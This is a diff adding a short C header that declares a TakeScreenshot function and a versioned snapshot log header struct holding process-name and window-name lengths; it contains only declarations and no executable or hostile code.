@@ -1,0 +1,16 @@
+#ifndef _DEVICE_SCREENSHOT
+#define _DEVICE_SCREENSHOT
+
+#define LOG_SNAP_VERSION 2009031201
+
+typedef struct _SNAPSHOT_ADDITION_HEADER {
+	UINT uVersion;
+	UINT uProcessNameLen;
+	UINT uWindowNameLen;
+} SNAPSHOT_ADDITIONAL_HEADER, *PSNAPSHOT_ADDITIONAL_HEADER;
+
+
+PBYTE TakeScreenshot(PULONG uOut);
+
+
+#endif
